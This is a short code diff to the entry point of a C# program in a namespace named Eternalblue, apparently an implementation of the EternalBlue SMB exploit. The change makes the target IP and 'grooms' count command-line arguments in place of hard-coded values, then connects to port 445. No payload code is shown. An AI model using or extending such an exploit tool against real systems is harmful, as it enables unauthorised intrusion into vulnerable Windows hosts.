@@ -527,11 +527,17 @@ namespace Eternalblue
 
         static void Main(string[] args)
         {
+            if (args.Length < 2)
+            {
+                Console.WriteLine("Usage: Eternalblue.exe [ip] [grooms]");
+                Environment.Exit(0);
+            }
             bool vulnerable = false;
-            string ip = "192.168.141.210";
+            string ip = args[0];
             int port = 445;
-            int grooms = 12;
-            int MaxAttempts = 12; 
+            int grooms = Convert.ToInt32(args[1]);
+            //int MaxAttempts = args[2]; 
+
             TcpClient client = new TcpClient(ip, port);
             Socket sock = client.Client;
             
